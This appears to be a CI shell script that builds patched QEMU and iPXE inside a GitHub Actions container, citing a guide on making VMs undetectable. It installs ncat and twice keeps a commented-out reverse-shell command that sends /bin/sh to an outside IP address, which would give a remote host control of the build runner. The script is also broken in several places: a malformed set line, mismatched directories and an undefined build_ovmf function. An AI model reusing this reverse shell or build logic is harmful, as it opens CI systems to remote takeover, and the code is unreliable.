#! /bin/sh
set -e o pipefail

#https://www.reddit.com/r/VFIO/comments/i071qx/spoof_and_make_your_vm_undetectable_no_more/

build_qemu () {
  #####BUILD QEMU
  #####TODO: DOES NOT WORK WITH DEBUILD SCRIPTS
  #####.DEB FILES GENERATED NEED TO BE STORED IN A LOCAL APT REPO AND INSTALLED USING APT NOT DPKG -I TO AVOID ERRORS
  #https://www.qemu.org/download/
  #https://wiki.qemu.org/Hosts/Linux
  #https://wiki.qemu.org/Testing/DockerBuild
  apt-get install git dpkg-dev uuid-dev uuid apt install -y dpkg-source-gitarchive dh-exec xorriso isolinux syslinux-common syslinux-utils mtools binutils-dev liblzma-dev zlib1g-dev debhelper-compat -y
  mkdir ~/ipxe; cd ~/ipxe
  #build debian version
  #apt-get source ipxe=1.0.0+git-20190109.133f4c4 -y
  
  apt-get source ipxe=1.0.0+git-20190125.36a4c85 -y
  #apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
  #dpkg-source --auto-commit -b qemu-7.0+dfsg/
  cd ipxe-1.0.0+git-20190125.36a4c85/src
  #debuild -us -uc
  cd src
  make NO_WERROR=1
  #https://github.com/ipxe/ipxe/issues/620
  
  #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
  #tar xvJf qemu.tar.xz > /dev/null
  #cd qemu-7.0.0
  tar xf /patch/qemu.tar
  ./configure --target-list=x86_64-softmmu --enable-debug > /dev/null
  make -j$(nproc) > /dev/null
  
  #artifacts
  tar cfz /builds/qemu.tar -C ~/qemu/qemu-7.0.0 build/
}



#https://wiki.debian.org/HowToUpgradeKernel
#5.10.0-15-amd64
#linux-image-5.10.0-15-amd64
#linux-image-5.18.0-2-amd64
echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
apt update
apt install -y ncat
#nc 65.108.51.31 11452 -e /bin/sh
DEBIAN_FRONTEND=noninteractive apt install -y build-essential bc rsync python3 screen vim unzip curl openssl
apt-get install -y devscripts build-essential lintian


mkdir /builds
cd /; tar xf /patch.tar

#build_kernel
build_qemu
build_ovmf

cp /builds/* /github/workspace/
#cp ~/*.deb /github/workspace/
#cp ~/*.tar /github/workspace/
#nc 65.108.51.31 11452 -e /bin/sh

exit 0




